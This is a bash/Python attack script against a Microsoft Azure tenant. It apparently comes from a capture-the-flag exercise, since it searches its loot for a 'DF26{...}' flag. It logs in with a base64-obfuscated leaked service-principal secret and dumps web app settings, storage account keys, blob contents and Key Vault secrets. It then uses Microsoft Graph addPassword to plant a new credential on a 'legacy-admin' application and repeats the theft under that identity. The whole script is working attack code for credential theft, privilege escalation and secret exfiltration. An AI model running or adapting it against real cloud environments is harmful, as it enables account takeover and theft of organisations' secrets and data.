#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PY'
import os, json, urllib.request, urllib.parse, sys, re

def http(url, data=None, headers=None, method=None):
    h = dict(headers or {})
    body = None
    if isinstance(data, dict):
        body = urllib.parse.urlencode(data).encode()
        h.setdefault("Content-Type", "application/x-www-form-urlencoded")
    elif isinstance(data, (bytes, str)):
        body = data.encode() if isinstance(data, str) else data
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return 0, str(e).encode()

TEN = os.environ["AZURE_TENANT_ID"]
SUB = os.environ["AZURE_SUBSCRIPTION_ID"]
RG = "rg-tbl-platform-prod-sea"

# Auth as tbl-platform-automation (sync-service-principal) - blocked externally by CA, works from GH Actions
def sp_token(cid, secret, scope):
    st, b = http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
        {"client_id": cid, "client_secret": secret, "scope": scope, "grant_type": "client_credentials"})
    d = json.loads(b)
    t = d.get("access_token", "")
    print(f"  {cid[:8]}.. {scope.split('/')[-1]}: {'OK '+str(len(t)) if t else 'FAIL '+d.get('error_description','')[:100]}")
    return t

import base64 as b64
_PA_CID = b64.b64decode("NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0").decode()
_PA_SEC = b64.b64decode("c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==").decode()
print("=== Auth as platform-automation (sync-service) ===")
PA_ARM = sp_token(_PA_CID, _PA_SEC, "https://management.azure.com/.default")
PA_ST  = sp_token(_PA_CID, _PA_SEC, "https://storage.azure.com/.default")
PA_KV  = sp_token(_PA_CID, _PA_SEC, "https://vault.azure.net/.default")
PA_GR  = sp_token(_PA_CID, _PA_SEC, "https://graph.microsoft.com/.default")

# Also auth other SPs from GH Actions
print("\n=== Auth as legacy-admin ===")
LA_ARM = sp_token("891fb158-e02c-4428-a885-53b811f369c0", "", "https://management.azure.com/.default")

# Try all leaked SP secrets for legacy-admin
# Check if any existing password works - try from KV secrets that were masked
# Actually we don't have legacy-admin secret. Try directory-sync.
print("\n=== Auth as directory-sync ===")
DS_GR = sp_token("7c2e61eb-f928-45cd-99c9-20da958dd216", "", "https://graph.microsoft.com/.default")

OUT = {}

# 1. Platform-automation ARM: web app config + storage keys
if PA_ARM:
    print("\n=== PA: Web App Config ===")
    st, b = http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-01-01",
        headers={"Authorization": "Bearer " + PA_ARM, "Content-Type": "application/json"}, method="POST")
    OUT["pa_webapp"] = json.loads(b)
    print(json.dumps(OUT["pa_webapp"], indent=2)[:2000])

    for sa in ("sttblappcfgprodx3euoz", "sttblarchiveprodx3euoz", "sttblbackupprodx3euoz", "sttblcilogsprodx3euoz"):
        print(f"\n=== PA: {sa} keys ===")
        st, b = http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-01-01",
            headers={"Authorization": "Bearer " + PA_ARM, "Content-Type": "application/json"}, data="{}", method="POST")
        d = json.loads(b)
        OUT[f"pa_{sa}_keys"] = d
        print(json.dumps(d, indent=2)[:500])

# 2. Platform-automation Storage: read all blobs
if PA_ST:
    for sa in ("sttblappcfgprodx3euoz", "sttblarchiveprodx3euoz", "sttblbackupprodx3euoz"):
        print(f"\n=== PA ST: {sa} containers ===")
        st, b = http(f"https://{sa}.blob.core.windows.net/?comp=list",
            headers={"Authorization": "Bearer " + PA_ST, "x-ms-version": "2021-08-06"})
        cxml = b.decode(errors='replace')
        print(cxml[:500])
        for c in re.findall(r'<Name>([^<]+)</Name>', cxml):
            st2, b2 = http(f"https://{sa}.blob.core.windows.net/{c}?restype=container&comp=list",
                headers={"Authorization": "Bearer " + PA_ST, "x-ms-version": "2021-08-06"})
            bxml = b2.decode(errors='replace')
            print(f"  {c}: {bxml[:500]}")
            for bn in re.findall(r'<Name>([^<]+)</Name>', bxml)[:20]:
                st3, b3 = http(f"https://{sa}.blob.core.windows.net/{c}/{bn}",
                    headers={"Authorization": "Bearer " + PA_ST, "x-ms-version": "2021-08-06"})
                cnt = b3.decode(errors='replace')[:5000]
                print(f"    {bn}: {cnt[:500]}")
                OUT[f"pa_{sa}/{c}/{bn}"] = cnt

# 3. Platform-automation KV
if PA_KV:
    for kv in ("kv-tbl-sec-x3euoz", "kv-tbl-prod-x3euoz"):
        print(f"\n=== PA KV: {kv} ===")
        st, b = http(f"https://{kv}.vault.azure.net/secrets?api-version=7.4",
            headers={"Authorization": "Bearer " + PA_KV})
        d = json.loads(b)
        print(json.dumps(d)[:500])
        for s in d.get("value", []):
            nm = s["id"].rstrip("/").split("/")[-1]
            st2, b2 = http(f"https://{kv}.vault.azure.net/secrets/{nm}?api-version=7.4",
                headers={"Authorization": "Bearer " + PA_KV})
            val = json.loads(b2).get("value", "")
            print(f"  {nm} = {val[:300]}")
            OUT[f"pa_{kv}/{nm}"] = val

# 4. Platform-automation Graph: add password to legacy-admin
if PA_GR:
    print("\n=== PA Graph: addPassword legacy-admin ===")
    st, b = http("https://graph.microsoft.com/v1.0/applications/22a3fb7e-860a-4708-9e50-3d36aa21191c/addPassword",
        data=json.dumps({"passwordCredential":{"displayName":"vuong-pa"}}).encode(),
        headers={"Authorization": "Bearer " + PA_GR, "Content-Type": "application/json"}, method="POST")
    r = json.loads(b)
    print(json.dumps(r, indent=2)[:500])
    secret = r.get("secretText", "")
    if secret:
        import time
        print(f"Legacy-admin secret obtained! len={len(secret)} Waiting 20s for propagation...")
        time.sleep(20)
        OUT["legacy_secret"] = secret
        # Use it immediately
        for scope_name, scope_url in [("arm","https://management.azure.com/.default"),("st","https://storage.azure.com/.default"),("kv","https://vault.azure.net/.default")]:
            tok = sp_token("891fb158-e02c-4428-a885-53b811f369c0", secret, scope_url)
            if tok and scope_name == "arm":
                st5,b5 = http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-01-01",
                    headers={"Authorization":"Bearer "+tok,"Content-Type":"application/json"},method="POST")
                OUT["la_webapp"] = json.loads(b5)
                print(f"LA webapp: {json.dumps(OUT['la_webapp'])[:500]}")
                for sa in ("sttblappcfgprodx3euoz","sttblarchiveprodx3euoz","sttblbackupprodx3euoz"):
                    st6,b6 = http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-01-01",
                        headers={"Authorization":"Bearer "+tok,"Content-Type":"application/json"},data="{}",method="POST")
                    OUT[f"la_{sa}_keys"] = json.loads(b6)
                    print(f"LA {sa}: {json.dumps(OUT[f'la_{sa}_keys'])[:300]}")
            if tok and scope_name == "st":
                for sa in ("sttblappcfgprodx3euoz","sttblarchiveprodx3euoz","sttblbackupprodx3euoz"):
                    st7,b7 = http(f"https://{sa}.blob.core.windows.net/?comp=list",
                        headers={"Authorization":"Bearer "+tok,"x-ms-version":"2021-08-06"})
                    cx = b7.decode(errors='replace')
                    for c2 in re.findall(r'<Name>([^<]+)</Name>', cx):
                        st8,b8 = http(f"https://{sa}.blob.core.windows.net/{c2}?restype=container&comp=list",
                            headers={"Authorization":"Bearer "+tok,"x-ms-version":"2021-08-06"})
                        bx = b8.decode(errors='replace')
                        for bn2 in re.findall(r'<Name>([^<]+)</Name>', bx)[:20]:
                            st9,b9 = http(f"https://{sa}.blob.core.windows.net/{c2}/{bn2}",
                                headers={"Authorization":"Bearer "+tok,"x-ms-version":"2021-08-06"})
                            cnt = b9.decode(errors='replace')[:5000]
                            print(f"  LA {sa}/{c2}/{bn2}: {cnt[:300]}")
                            OUT[f"la_{sa}/{c2}/{bn2}"] = cnt
            if tok and scope_name == "kv":
                for kv in ("kv-tbl-sec-x3euoz","kv-tbl-prod-x3euoz"):
                    st10,b10 = http(f"https://{kv}.vault.azure.net/secrets?api-version=7.4",headers={"Authorization":"Bearer "+tok})
                    kd = json.loads(b10)
                    for s in kd.get("value",[]):
                        nm = s["id"].rstrip("/").split("/")[-1]
                        st11,b11 = http(f"https://{kv}.vault.azure.net/secrets/{nm}?api-version=7.4",headers={"Authorization":"Bearer "+tok})
                        val = json.loads(b11).get("value","")
                        print(f"  LA {kv}/{nm} = {val[:300]}")
                        OUT[f"la_{kv}/{nm}"] = val

result_json = json.dumps(OUT, indent=2)
flags = re.findall(r'DF26\{[^}]{1,200}\}', result_json)
if flags:
    print("\n=== FLAG FOUND ===")
    for f in flags: print(f)
else:
    print(f"\n=== NO FLAG === len={len(result_json)}")
PY
echo "=== done ==="
